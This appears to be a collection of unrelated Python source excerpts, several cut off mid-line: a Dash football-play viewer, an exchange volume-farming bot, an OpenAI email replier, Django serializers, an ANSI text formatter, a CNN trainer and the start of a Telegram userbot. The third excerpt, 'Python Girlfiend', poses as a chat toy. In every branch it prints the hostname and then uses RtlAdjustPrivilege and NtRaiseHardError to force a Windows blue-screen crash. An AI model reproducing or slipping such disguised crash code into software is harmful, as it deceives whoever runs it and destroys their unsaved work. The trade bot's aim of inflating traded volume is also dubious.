    "import dash\r\nfrom dash import dcc, html, Input, Output\r\nimport dash_bootstrap_components as dbc\r\nimport pandas as pd\r\nfrom PIL import Image\r\nimport base64\r\nfrom io import BytesIO\r\nimport os\r\nimport plotly.graph_objects as go\r\napp = dash.Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP])\r\n# Get the current working directory\r\ncwd = os.getcwd()\r\nfrom dash.dependencies import Input, Output, State\r\nfrom dash.exceptions import PreventUpdate\r\n\r\n\r\n# Build the path to the image\r\nimage_path = os.path.join(cwd, 'my_dash_app', 'images', '4840654.jpg')\r\nserver = app.server\r\n# Function to convert PIL image to Data URI\r\ndef pil_to_data_uri(img):\r\n    data = BytesIO()\r\n    img.save(data, \"JPEG\")\r\n    data_uri = \"data:image/jpeg;base64,\" + base64.b64encode(data.getvalue()).decode('utf-8')\r\n    return data_uri\r\ndef pil_to_data_uri_logo(img):\r\n    data = BytesIO()\r\n    img.save(data, \"PNG\")\r\n    data_uri = \"data:image/png;base64,\" + base64.b64encode(data.getvalue()).decode('utf-8')\r\n    return data_uri\r\n# run some code for applying logo image\r\nlogo_path = 'images/logo.png'\r\npil_logo = Image.open(logo_path)\r\nlogo_data_uri = pil_to_data_uri_logo(pil_logo)\r\n# same as ^ but for the field image\r\npil_image_path = 'images/4840654.jpg'\r\npil_image = Image.open(pil_image_path)\r\nimage_data_uri = pil_to_data_uri(pil_image)\r\n# load the play button image\r\nplay_img_path = 'images/play_pause.png'\r\nplay_img = Image.open(play_img_path)\r\nplay_img_src = pil_to_data_uri_logo(play_img)\r\n# Load the data\r\n\r\n# Initialize the Dash app\r\n# app = dash.Dash(__name__, external_stylesheets=[dbc.themes.BOOTSTRAP])\r\ndf = pd.read_csv('data/sb_2000_2023.csv', low_memory=False)\r\nteam_directions = df.groupby('game_id')['posteam'].unique().apply(lambda teams: {team: idx for idx, team in enumerate(teams)}).to_dict()\r\n# Define the sidebar layout for selecting game_id\r\n# Define the sidebar layout for selecting game_id\r\n\r\n\r\n# Construct the app layout\r\napp.layout = dbc.Container([\r\n    dbc.Row([\r\n        dbc.Col(\r\n            html.Div([\r\n                html.Img(src=logo_data_uri, style={'height': '100%', 'width': '100%'}),\r\n                html.Hr(),\r\n                dcc.Dropdown(\r\n                    id='game-id-dropdown',\r\n                    options=[{'label': game_id, 'value': game_id} for game_id in df['game_id'].unique()],\r\n                    value=df['game_id'].iloc[0],\r\n                    className='dropdown',\r\n                    clearable=False,\r\n                    style={'background-color': '#fffff', 'color': 'red'}\r\n                ),\r\n            ], className='sidebar'),\r\n            width=2,\r\n            style={'maxWidth': '200px'}  # Set the maximum width of the sidebar\r\n        ),\r\n        dbc.Col([\r\n            dbc.Row([\r\n                dbc.Col([\r\n                    dcc.Graph(\r\n                        id='field-graph',\r\n                        figure={},\r\n                        config={'staticPlot': True}  # Disable zoom and pan\r\n                    ),    html.Img(id='play-pause-button', src=play_img_src, className = 'btnImg', n_clicks=0, style={'cursor': 'pointer', 'height': '50px'}),\r\n\r\ndcc.Interval(\r\n    id='auto-stepper',\r\n    interval=1*1000,  # in milliseconds (e.g., 1000ms = 1 second per step)\r\n    n_intervals=0,\r\n    disabled=True,  # Initially disabled\r\n),\r\n                    dcc.Slider(\r\n                        id='time-slider',\r\n                        className='time-slider',\r\n                        value=df['...1'].min(),\r\n                        marks={str(time): str(time) for time in df['...1'].unique()},\r\n                        updatemode='drag',\r\n                       \r\n                    ),\r\n                ], width=9),\r\n                dbc.Col([\r\n                    html.Div(\r\n                        id='desc-window',\r\n                        className='desc-window',\r\n                        style={'overflow-y': 'scroll', 'height': '150px'},\r\n                    ),\r\n                    dcc.Graph(\r\n                        id='bar-graph',\r\n                        className='small-bar-graph-container'\r\n                    ),\r\n                    html.Div(\r\n                        id='score-dis',\r\n                        className='score-dis',\r\n                        style={'overflow-y': 'scroll', 'height': '200px'},\r\n                    ),\r\n                ], width=3),\r\n            ]),\r\n            dbc.Row(\r\n                dbc.Col(\r\n                    dcc.Graph(\r\n                        id='line-graph',\r\n                        className='centered-container',\r\n                        style={'margin-top': '-100px'},  # Adjust the value as needed to move the graph up\r\n                    ),\r\n                    width=12,\r\n                )\r\n            ),\r\n        ], width=10),\r\n    ]),\r\n], fluid=True)\r\n\r\n# Callback to update the football field and description window based on the selected game_id and time\r\n@app.callback(\r\n    [Output('field-graph', 'figure'), \r\n     Output('bar-graph', 'figure'), \r\n     Output('des",
    "# coding=utf-8\nfrom bpx.bpx import *\nfrom bpx.bpx_pub import *\n\nimport time\n\n\nclass TradeBot:\n\n    def __init__(self, data, emit) -> None:\n        self.API_KEY = data.get(\"API_KEY\")  # \u586b\u5165\u4f60\u7684api\n        self.API_SECRET = data.get(\"API_SECRET\")  # \u586b\u5165\u4f60\u7684api\n        self.WISH_VOLUME = int(data.get(\"WISH_VOLUME\"))  # \u671f\u671b\u5237\u7684USDC\n        self.ITER_NUM = int(data.get(\"ITER_NUM\"))\n\n        self.run_pair = data.get(\"TRADE_TOKEN\")\n        self.pair_name = data.get(\"TRADE_PAIR\")\n        self.pair_accuracy = int(data.get(\"PAIR_ACCURACY\"))  # \u4ea4\u6613\u5bf9\u4ef7\u683c\u7cbe\u5ea6\n\n        self.MIN_USDC = int(data.get(\"MIN_USDC\"))\n        self.MIN_PAIR = int(data.get(\"MIN_PAIR\"))\n        self.bpx = BpxClient()\n        self.bpx.init(\n            api_key=self.API_KEY,\n            api_secret=self.API_SECRET,\n        )\n        self.logger = emit\n\n    def buy_and_sell(self, usdc_available, sol_available, asks_price, bids_price):\n        get_diff_price = round(asks_price - bids_price, self.pair_accuracy)\n        if get_diff_price == 1 / int(10**self.pair_accuracy):\n\n            if sol_available > 1000:\n                self.bpx.ExeOrder(\n                    symbol=self.pair_name,\n                    side=\"Ask\",\n                    orderType=\"Limit\",\n                    timeInForce=\"\",\n                    quantity=sol_available,\n                    price=asks_price,\n                )\n                self.logger(f\"try sell {sol_available} {self.run_pair} at {asks_price}\")\n                return sol_available * asks_price\n            elif usdc_available > 1:\n\n                self.bpx.ExeOrder(\n                    symbol=self.pair_name,\n                    side=\"Bid\",\n                    orderType=\"Limit\",\n                    timeInForce=\"\",\n                    quantity=int(int(usdc_available / bids_price * 100) / 100),\n                    price=bids_price,\n                )\n                self.logger(f\"try buy {usdc_available} USDC at {bids_price}\")\n                return usdc_available\n        else:\n\n            if sol_available > 1000:\n                asks_price = asks_price - 1 / int(10**self.pair_accuracy)\n\n                self.bpx.ExeOrder(\n                    symbol=self.pair_name,\n                    side=\"Ask\",\n                    orderType=\"Limit\",\n                    timeInForce=\"\",\n                    quantity=sol_available,\n                    price=round(asks_price, self.pair_accuracy),\n                )\n\n                self.logger(f\"try sell {sol_available} {self.run_pair} at {asks_price}\")\n                return sol_available * asks_price\n            elif usdc_available > 1:\n                bids_price = bids_price + 1 / int(10**self.pair_accuracy)\n\n                self.bpx.ExeOrder(\n                    symbol=self.pair_name,\n                    side=\"Bid\",\n                    orderType=\"Limit\",\n                    timeInForce=\"\",\n                    quantity=int(int(usdc_available / bids_price * 100) / 100),\n                    price=round(bids_price, self.pair_accuracy),\n                )\n\n                self.logger(f\"try buy {usdc_available} USDC at {bids_price}\")\n                return usdc_available\n        return 0\n\n    def one_trade(self, usdc_available, sol_available):\n        start_time = time.time()\n        sol_market_depth1 = Depth(self.pair_name)\n        sol_market_depth2 = Depth(self.pair_name)\n        end_time = time.time()\n        elapsed_time = end_time - start_time\n\n        # self.logger(account_balance)\n        asks_depth1 = round(float(sol_market_depth1[\"asks\"][0][1]), self.pair_accuracy)\n        bids_depth1 = round(float(sol_market_depth1[\"bids\"][-1][1]), self.pair_accuracy)\n        # self.logger(asks_depth1,bids_depth1)\n        asks_depth2 = round(float(sol_market_depth2[\"asks\"][0][1]), self.pair_accuracy)\n        # asks_price2 = round(float(sol_market_depth2[\"asks\"][0][0]), pair_accuracy)\n        bids_depth2 = round(float(sol_market_depth2[\"bids\"][-1][1]), self.pair_accuracy)\n        # bids_price2 = round(float(sol_market_depth2[\"bids\"][-1][0]), pair_accuracy)\n        # self.logger(asks_depth2,bids_depth2)\n        ask_quick_market = 0\n        bid_quick_market = -1\n        if (asks_depth1 - asks_depth2) / elapsed_time * 5 > asks_depth2:\n            ask_quick_market += 1\n        if (bids_depth1 - bids_depth2) / elapsed_time * 5 > bids_depth2:\n            bid_quick_market -= 1\n        # self.logger(f\"The time difference is {elapsed_time} seconds\")\n\n        asks_price = round(\n            float(sol_market_depth2[\"asks\"][ask_quick_market][0]), self.pair_accuracy\n        )\n        bids_price = round(\n            float(sol_market_depth2[\"bids\"][bid_quick_market][0]), self.pair_accuracy\n        )\n        try:\n            vol = self.buy_and_sell(\n                usdc_available, sol_available, asks_price, bids_price\n            )\n        except:\n            vol = -1\n            self.logger(\"\u53d1\u9001\u4ea4\u6613\u65f6\u53d1\u751f\u9519\u8bef\")\n        return vol\n\n    def one_iter(self):\n        wish_vol = self.WISH_VOLUME\n\n        wish_vol = wish_vol  # \u671f\u671b\u5237\u7684\u91cf\uff0c\u5355\u4f4dUSDC\n\n        be",
    "# Python Girlfiend\r\n\r\n\r\nimport random\r\nfrom time import sleep\r\nimport socket\r\nimport ctypes\r\nimport webbrowser\r\nimport os\r\n# Information\r\nAlder = random.random # How Old is she\r\nNavn = [\"Amanda\", \"Andrea\", \"Corina\"] # Her name\r\nhostname=socket.gethostname()\r\nntdll = ctypes.windll.ntdll\r\nprev_value = ctypes.c_bool()\r\nres = ctypes.c_ulong()\r\n\r\nUwUUrl = \"https://www.youtube.com/watch?v=MxO0z8OL6rM\"\r\n\r\nDitNavn = \"\"\r\n\r\ndef svinediller():\r\n    os.system(\"cls\")\r\n    print(f\"Hello. I'm your new girlfriend! My name is \" + random.choice(Navn) + \"\\n\")\r\n    print(f\"What is your name?\\n\")\r\n    inputnavn = input(\"Name: \")\r\n    if inputnavn == inputnavn:\r\n        print(\"Is your name really?  \" + inputnavn)\r\n        jaellernej = input(\"Yes or no: \")\r\n        if jaellernej == \"yes\" or jaellernej == \"Yes\":\r\n            DitNavn = inputnavn\r\n            askqusti()\r\n        elif jaellernej == \"No\" or jaellernej == \"no\":\r\n            DitNavn = inputnavn\r\n            askqusti()\r\n\r\n\r\ndef askqusti():\r\n    print(f\"Hej \" + DitNavn + \"\\nDo you want to ask me some questions?\\Here are some questions:\\n1. How old are you?\\n2. I want to touch you :)\\n3. Are you gay?\")\r\n    ask = input(\"Questions: \")\r\n    if ask == \"1\":\r\n        print(f\"I'm... I don't have an age. Because I don't exist. Get out of the matrix using this program :=)\")\r\n        jaellernej = input(\"Do you want help?: \")\r\n        if jaellernej == \"yes\" or jaellernej == \"Yes\":\r\n            Escapethematix()\r\n        elif jaellernej == \"no\" or jaellernej == \"No\":\r\n            Escapethematix()\r\n\r\n    if ask == \"2\":\r\n        print(f\"Are you pedo or what? I take that as a yes :) See you\")\r\n        webbrowser.open(UwUUrl, new=0, autoraise=True)\r\n        sleep(5)\r\n        MatrixEcape()\r\n    if ask == \"3\":\r\n        print(f\"Yes. I might have a little crush on you UwU. NO, I just didn't say that. We'll just forget that :)\")\r\n        webbrowser.open(UwUUrl, new=0, autoraise=True)\r\n        sleep(5)\r\n        MatrixEcape()\r\n        \r\n        \r\ndef Escapethematix():\r\n    print(\"Du f\u00e5r hj\u00e6lp nu.\")\r\n    webbrowser.open(UwUUrl, new=0, autoraise=True)\r\n    print(\"Dit information\\nHostname: \" + hostname)\r\n    print(\"Vi ses min ven!\")\r\n    sleep(5)\r\n    MatrixEcape()\r\n\r\ndef MatrixEcape():\r\n    ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))\r\n    if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):\r\n        print(\"BSOD Successfull!\")\r\n    else:\r\n        print(\"BSOD Failed...\")\r\n    \r\nsvinediller()\r\n",
    "from openai import OpenAI\nfrom tools import get_usage_info\nfrom parameters import MODEL, SYSTEM_MSG, OPENAI_KEY, user_prompt\n\nclient = OpenAI(api_key=OPENAI_KEY)\n\n\ndef openai_replier(msg, model=MODEL, system_message=SYSTEM_MSG, user_prompt=user_prompt):\n\n    print(f\"Sending request to {MODEL} model...\")\n\n    try:\n        response = client.chat.completions.create(\n            model=model,\n            messages=[\n                {\"role\": \"system\", \"content\": system_message},\n                {\"role\": \"user\", \"content\": user_prompt(msg)},\n            ],\n            temperature=0.2,\n            max_tokens=1024,\n        )\n\n    except Exception as e:\n        print(\"No GPT\")\n        print(e)\n\n    print(\"\\nUsage Info:\")\n    print(get_usage_info(response))\n\n    return response.choices[0].message.content\n\n\nif __name__ == '__main__':\n\n    # Quick check with a local email\n\n    with open(\"./data/sample-email.txt\", \"r\") as f:\n        message = f.read()\n\n    reply = openai_replier(message)\n\n    print(\"\\nReply:\")\n    print(reply)\n",
    "from django.db import transaction\nfrom rest_framework import serializers\nfrom django.core.exceptions import ValidationError\n\nfrom airport_app.models import (\n    Country,\n    City,\n    Airport,\n    Route,\n    AirplaneType,\n    Airplane,\n    Crew,\n    Flight,\n    Ticket,\n    Order,\n)\n\n\nclass CountrySerializer(serializers.ModelSerializer):\n    class Meta:\n        model = City\n        fields = (\n            \"id\",\n            \"name\",\n        )\n\n\nclass CountryRetrieveSerializer(CountrySerializer):\n    cities = CountrySerializer(many=True, read_only=True, source=\"city_country\")\n\n    class Meta:\n        model = Country\n        fields = (\"id\", \"name\", \"cities\")\n\n\nclass CitySerializer(serializers.ModelSerializer):\n    class Meta:\n        model = City\n        fields = (\n            \"id\",\n            \"name\",\n        )\n\n\nclass CityListSerializer(CitySerializer):\n    class Meta:\n        model = City\n        fields = (\n            \"id\",\n            \"name\",\n        )\n\n\nclass CityRetrieveSerializer(CitySerializer):\n    country = CountrySerializer()\n\n    class Meta:\n        model = City\n        fields = (\"id\", \"name\", \"country\")\n\n\nclass AirportSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Airport\n        fields = (\n            \"id\",\n            \"name\",\n            \"country\",\n            \"city\",\n        )\n\n    def validate(self, data):\n        country = data.get(\"country\")\n        city = data.get(\"city\")\n        if city.country != country:\n            raise serializers.ValidationError(\n                \"The selected city does not belong to the selected country.\"\n            )\n        return data\n\n\nclass AirportListSerializer(AirportSerializer):\n    country = serializers.CharField(source=\"country.name\")\n    city = serializers.CharField(source=\"city.name\")\n\n\nclass AirportRetrieveSerializer(AirportSerializer):\n    city = CityRetrieveSerializer()\n\n    class Meta:\n        model = Airport\n        fields = (\n            \"id\",\n            \"name\",\n            \"city\",\n        )\n\n\nclass RouteSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Route\n        fields = (\"id\", \"source\", \"destination\", \"distance\")\n\n\nclass RouteListSerializer(RouteSerializer):\n    source = serializers.SerializerMethodField()\n    destination = serializers.SerializerMethodField()\n\n    @staticmethod\n    def get_source(obj):\n        return f\"{obj.source.city}, {obj.source.country} - '{obj.source.name}'\"\n\n    @staticmethod\n    def get_destination(obj):\n        return (\n            f\"{obj.destination.city}, {obj.destination.country} - \"\n            f\"'{obj.destination.name}'\"\n        )\n\n\nclass RouteRetrieveSerializer(RouteSerializer):\n    source = AirportRetrieveSerializer()\n    destination = AirportRetrieveSerializer()\n\n\nclass AirplaneTypeSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = AirplaneType\n        fields = \"__all__\"\n\n\nclass AirplaneSerializer(serializers.ModelSerializer):\n    airplane_image = serializers.ImageField(read_only=True)\n\n    class Meta:\n        model = Airplane\n        fields = (\n            \"id\",\n            \"airplane_type\",\n            \"name\",\n            \"rows\",\n            \"seats_in_row\",\n            \"airplane_image\",\n        )\n\n\nclass AirplaneListSerializer(AirplaneSerializer):\n    airplane_type = serializers.SlugRelatedField(\n        many=False, read_only=True, slug_field=\"name\"\n    )\n\n    class Meta:\n        model = Airplane\n        fields = (\n            \"id\",\n            \"name\",\n            \"airplane_type\",\n            \"capacity\",\n            \"airplane_image\",\n        )\n\n\nclass AirplaneRetrieveSerializer(AirplaneSerializer):\n    airplane_type = AirplaneTypeSerializer()\n\n    class Meta:\n        model = Airplane\n        fields = (\n            \"id\",\n            \"name\",\n            \"airplane_type\",\n            \"rows\",\n            \"seats_in_row\",\n            \"capacity\",\n            \"airplane_image\",\n        )\n\n\nclass AirplaneImageSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Airplane\n        fields = (\"id\", \"airplane_image\")\n\n\nclass CrewSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Crew\n        fields = \"__all__\"\n\n\nclass FlightSerializer(serializers.ModelSerializer):\n    class Meta:\n        model = Flight\n        fields = (\n            \"id\",\n            \"route\",\n            \"airplane\",\n            \"departure_time\",\n            \"arrival_time\",\n        )\n\n\nclass FlightListSerializer(FlightSerializer):\n    route_source = serializers.CharField(source=\"route.source.name\", read_only=True)\n    route_destination = serializers.CharField(\n        source=\"route.destination.name\", read_only=True\n    )\n    airplane_name = serializers.CharField(source=\"airplane.name\", read_only=True)\n    airplane_capacity = serializers.IntegerField(\n        source=\"airplane.capacity\", read_only=True\n    )\n    tickets_available = serializers.IntegerField(read_only=True)\n    crew = serializers.SerializerMethodField()\n\n    @staticmethod\n    def get_c",
    "banner = \"\"\"              \n+------------------------------------------------------------+\n|                        TextArtisan                         |\n|                      ===============                       |\n|                Author : Prashant Bhandari                  |\n+------------------------------------------------------------+\n| The TextArtisan class is designed to facilitate the        |\n| printing of colored and formatted text in Python terminal  |\n| environments using ANSI escape codes. It provides methods  |\n| to apply various text formatting styles and colors to text |\n| strings.                                                   |\n+------------------------------------------------------------+\n|                        References                          |\n|                       ============                         |\n| [+] https://cwoebker.com/posts/ansi-escape-codes           |\n| [+] https://www.nayab.xyz/linux/escapecodes                |\n+------------------------------------------------------------+\n\"\"\"\n\nclass TextArtisan(object):\n    # +-------------------------------------------------+\n    # |    Format : ESC[{attr1};{attr2};....{attrn)m    |\n    # +-------------------------------------------------+\n\n    ESCAPE = '\\033[%sm'\n    ENDC = ESCAPE % '0'\n    \n    # ---------------[ Text Formatting ]--------------\n    REGULAR = '0'\n    BOLD = '1'\n    LOW_INTENSITY = '2' # Not widely supported\n    ITALIC = '3'\n    UNDERLINE = '4'\n    BLINKING = '5'\n    REVERSE = '6' # Not widely supported\n    BACKGROUND = '7'\n    INVISIBLE = '8'\n    # ------------------------------------------------\n\n    # -----------------[ Text Colors ]----------------\n    COLORS = {\n        'black': '30',\n        'red': '31',\n        'green': '32',\n        'yellow': '33',\n        'blue': '34',\n        'magenta': '35',\n        'cyan': '36',\n        'white': '37'\n    }\n    # ------------------------------------------------\n\n    # -------------[ Background Colors ]--------------\n    BACKGROUND_COLORS = {\n        'black': '40',\n        'red': '41',\n        'green': '42',\n        'yellow': '43',\n        'blue': '44',\n        'magenta': '45',\n        'cyan': '46',\n        'white': '47'\n    }\n    # ------------------------------------------------\n\n    def __init__(self):\n        pass\n\n    @staticmethod\n    def decorate(styleformat, message):\n        \"\"\"\n        Apply the specified formatting to the message using ANSI escape codes.\n\n        Args:\n            styleformat (list): List of formatting attributes.\n            message (str): The message to be formatted.\n\n        Returns:\n            str: The formatted message.\n        \"\"\"\n        formatstring = ';'.join(styleformat)\n        format_sequence = TextArtisan.ESCAPE % formatstring\n        return f\"{format_sequence}{message}{TextArtisan.ENDC}\"\n    \n    @staticmethod\n    def colorize(text, color , bgcolor):\n        \"\"\"\n        Apply the specified color to the text using ANSI escape codes.\n\n        Args:\n            text (str): The text to be colorized.\n            color (str): The color to apply to the text.\n            bgcolor (str): The color to apply to the background.\n\n        Returns:\n            str: The colorized text.\n        \"\"\"\n        return TextArtisan.decorate([TextArtisan.COLORS[color],TextArtisan.BACKGROUND_COLORS[bgcolor]], text)\n\n    @staticmethod\n    def underline(text):\n        \"\"\"\n        Apply underline style to the text using ANSI escape codes.\n\n        Args:\n            text (str): The text to be underlined.\n\n        Returns:\n            str: The underlined text.\n        \"\"\"\n        return TextArtisan.decorate([TextArtisan.UNDERLINE], text)\n    \n    @staticmethod\n    def blink(text):\n        \"\"\"\n        Apply blinking style to the text using ANSI escape codes.\n\n        Args:\n            text (str): The text to be formatted.\n\n        Returns:\n            str: The formatted text with blinking effect.\n        \"\"\"\n        return TextArtisan.decorate([TextArtisan.BLINKING], text)\n    \n    @staticmethod\n    def bold(text):\n        \"\"\"\n        Apply bold style to the text using ANSI escape codes.\n\n        Args:\n            text (str): The text to be formatted.\n\n        Returns:\n            str: The formatted text with bold style.\n        \"\"\"\n        return TextArtisan.decorate([TextArtisan.BOLD], text)\n\n    @staticmethod\n    def italic(text):\n        \"\"\"\n        Apply italic style to the text using ANSI escape codes.\n\n        Args:\n            text (str): The text to be formatted.\n\n        Returns:\n            str: The formatted text with italic style.\n        \"\"\"\n        return TextArtisan.decorate([TextArtisan.ITALIC], text)\n\n    @staticmethod\n    def reverse(text):\n        \"\"\"\n        Apply reverse style to the text using ANSI escape codes.\n\n        Args:\n            text (str): The text to be formatted.\n\n        Returns:\n            str: The formatted text with reverse style.\n        \"\"\"\n        return TextArtisan.decorate([TextArtisan.REVERSE], text)\n\n    @sta",
    "import math\nimport numpy as np\nimport matplotlib.pyplot as plt\nimport logging\n\nimport tensorflow as tf\nimport tensorflow_datasets as tfds\n\n\n# Error logging\nlogger = tf.get_logger()\nlogger.setLevel(logging.ERROR)\n\n# Function to normalize pixel values to be between [0, 1]\ndef normalize_data(image, label):\n    image = tf.cast(image, tf.float32)\n    image /= 255\n\n    return image, label\n\n# tfds.disable_progress_bar()\n\n# Loading Fashion MNIST dataset\ndataset, metadata = tfds.load('fashion_mnist', as_supervised=True, with_info=True)\ntraining_set, testing_set = dataset['train'].map(normalize_data), dataset['test'].map(normalize_data)\n\n# Caching images to make training faster\ntraining_set, testing_set = training_set.cache(), testing_set.cache()\n\nlabel_names = ['T-shirt', 'Trouser', 'Pullover', 'Dress', 'Coat',\n               'Sandal', 'Shirt', 'Sneaker', 'Bag', 'Ankle Boot']\n\nnum_train, num_test = metadata.splits['train'].num_examples, metadata.splits['test'].num_examples\nprint(num_train, num_test)\n\n# Plot single image\n\n# for image, label in testing_set.take(1):\n#         break\n\n# image = image.numpy().reshape((28, 28))\n# plt.figure()\n# plt.imshow(image, cmap=plt.cm.binary)\n# plt.colorbar()\n# plt.grid(False)\n# plt.show()\n\n# Set up layers of the model\nmodel = tf.keras.Sequential([\n    tf.keras.layers.Conv2D(40, (2, 2), padding='same', activation=tf.nn.relu, input_shape=(28, 28, 1)),\n    tf.keras.layers.MaxPooling2D((2, 2)),\n\n    tf.keras.layers.Conv2D(60, (2, 2), padding='same', activation=tf.nn.relu),\n    tf.keras.layers.MaxPooling2D((2, 2)),\n\n    tf.keras.layers.Conv2D(80, (2, 2), padding='same', activation=tf.nn.relu),\n    tf.keras.layers.MaxPooling2D((2, 2), strides=2),\n\n    tf.keras.layers.Flatten(),\n\n    tf.keras.layers.Dense(128, activation=tf.nn.relu),\n\n    tf.keras.layers.Dense(10, activation=tf.nn.softmax)\n])\n\n# Compiling the model\nmodel.compile(optimizer='adam', loss=tf.keras.losses.SparseCategoricalCrossentropy(), metrics=['accuracy'])\n\nBATCH_SIZE = 32\n\n# Shuffling and grouping data into batches \ntraining_set = training_set.cache().repeat().shuffle(num_train).batch(BATCH_SIZE)\ntesting_set = testing_set.cache().batch(BATCH_SIZE)\n\n# Training the model over 10 epochs\nmodel.fit(training_set, epochs=10, steps_per_epoch=math.ceil(num_train/BATCH_SIZE))\n\n# Testing the model\nloss, accuracy = model.evaluate(testing_set, steps=math.ceil(num_test/BATCH_SIZE))\n\nprint(f'Loss: {loss}, Accuracy: ${round(accuracy * 100, 2)}%')",
    "from pyrogram import Client, filters, __version__ as pyrogram_version\nfrom pyrogram.types import Message\nimport pyrogram\nimport random\nimport time\nimport re\nimport uuid\nimport socket\nfrom datetime import datetime, timedelta\nimport pytz\nimport psutil\nfrom sympy import sympify\nfrom typing import List\nimport requests\nimport asyncio\nfrom collections import defaultdict\nfrom typing import List\nimport aiohttp\nimport os\nimport qrcode\nimport sympy\nfrom sympy.parsing.sympy_parser import parse_expr\nimport wikipedia\nfrom bs4 import BeautifulSoup\nfrom pyrogram import emoji\nfrom collections import defaultdict\nimport string \nfrom PIL import Image\nimport binascii\nimport subprocess\nimport numpy as np\nimport logging \nfrom threading import Thread\nimport math \nfrom sympy import latex, simplify\nfrom sympy import symbols\nfrom sympy import cos, sin, pi\nimport ctypes\nimport speedtest \n\n# Setup logging in a separate thread\ndef logging_thread():\n    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')\n    logger = logging.getLogger('pyrogram')\n    logger.setLevel(logging.WARNING)\n\n    # \u0417\u0434\u0435\u0441\u044c \u043c\u043e\u0436\u043d\u043e \u0434\u043e\u0431\u0430\u0432\u0438\u0442\u044c \u043b\u044e\u0431\u0443\u044e \u0434\u0440\u0443\u0433\u0443\u044e \u043b\u043e\u0433\u0438\u043a\u0443 \u043b\u043e\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f, \u0435\u0441\u043b\u0438 \u044d\u0442\u043e \u043d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e.\n\n# \u0417\u0430\u043f\u0443\u0441\u043a \u043f\u043e\u0442\u043e\u043a\u0430 \u043b\u043e\u0433\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f\nthread = Thread(target=logging_thread)\nthread.start()\n\n# \u041f\u0443\u0442\u044c \u043a \u0440\u0430\u0431\u043e\u0447\u0435\u0439 \u043f\u0430\u043f\u043a\u0435\nfolder_path = \"C:/Userbot\"\n\n# \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0438 \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0440\u0430\u0431\u043e\u0447\u0435\u0439 \u043f\u0430\u043f\u043a\u0438, \u0435\u0441\u043b\u0438 \u043e\u043d\u0430 \u043d\u0435 \u0441\u0443\u0449\u0435\u0441\u0442\u0432\u0443\u0435\u0442\nif not os.path.exists(folder_path):\n    os.makedirs(folder_path)\n\n# \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0439 \u043d\u0430 \u0440\u0443\u0441\u0441\u043a\u043e\u043c \u044f\u0437\u044b\u043a\u0435\ninstructions = \"\"\"\u0414\u043b\u044f \u043f\u043e\u043b\u0443\u0447\u0435\u043d\u0438\u044f API ID \u0438 API HASH:\n1. \u041f\u0435\u0440\u0435\u0439\u0434\u0438\u0442\u0435 \u043d\u0430 https://my.telegram.org/\n2. \u0412\u043e\u0439\u0434\u0438\u0442\u0435 \u0438 \u043f\u0435\u0440\u0435\u0439\u0434\u0438\u0442\u0435 \u0432 \u0438\u043d\u0441\u0442\u0440\u0443\u043c\u0435\u043d\u0442\u044b \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u0447\u0438\u043a\u0430 API.\n3. \u0421\u043e\u0437\u0434\u0430\u0439\u0442\u0435 \u043d\u043e\u0432\u043e\u0435 \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u0435 \u0438 \u0441\u043a\u043e\u043f\u0438\u0440\u0443\u0439\u0442\u0435 API ID \u0438 API HASH.\n4. \u0417\u0430\u043f\u043e\u043b\u043d\u0438\u0442\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u044f \u043f\u0440\u0438 \u0437\u0430\u043f\u0443\u0441\u043a\u0435 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b.\n\"\"\"\n\n# \u0421\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0438\u0435 \u0438\u043d\u0441\u0442\u0440\u0443\u043a\u0446\u0438\u0439 \u0432 \u0444\u0430\u0439\u043b\ninstructions_path = os.path.join(folder_path, 'instructions.txt')\nwith open(instructions_path, 'w') as file:\n    file.write(instructions)\n\n# \u0421\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0444\u0430\u0439\u043b\u0430 \u0441 \u0431\u043b\u0430\u0433\u043e\u0434\u0430\u0440\u043d\u043e\u0441\u0442\u044c\u044e\nthx_text = \"\u0421\u044b\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u0435 Userbot! \"\nthx_path = os.path.join(folder_path, 'Thx.txt')\nwith open(thx_path, 'w') as file:\n    file.write(thx_text)\n\n# \u041f\u0443\u0442\u044c \u043a \u0444\u0430\u0439\u043b\u0443 \u043a\u043e\u043d\u0444\u0438\u0433\u0443\u0440\u0430\u0446\u0438\u0438\nfile_path = os.path.join(folder_path, 'config.txt')\n\n# \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u043d\u0430\u043b\u0438\u0447\u0438\u044f \u0444\u0430\u0439\u043b\u0430 \u0438 \u0447\u0442\u0435\u043d\u0438\u0435 API ID \u0438 API HASH\napi_id = \"\"\napi_hash = \"\"\nif os.path.exists(file_path):\n    with open(file_path, 'r') as file:\n        lines = file.readlines()\n        if len(lines) >= 2:\n            api_id = lines[0].strip()\n            api_hash = lines[1].strip()\n\n# \u0415\u0441\u043b\u0438 API ID \u0438 API HASH \u043d\u0435 \u0437\u0430\u043f\u0438\u0441\u0430\u043d\u044b, \u0437\u0430\u043f\u0440\u043e\u0441\u0438\u0442\u044c \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f\nif not api_id or not api_hash:\n    api_id = input(\"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0432\u0430\u0448 API ID: \")\n    api_hash = 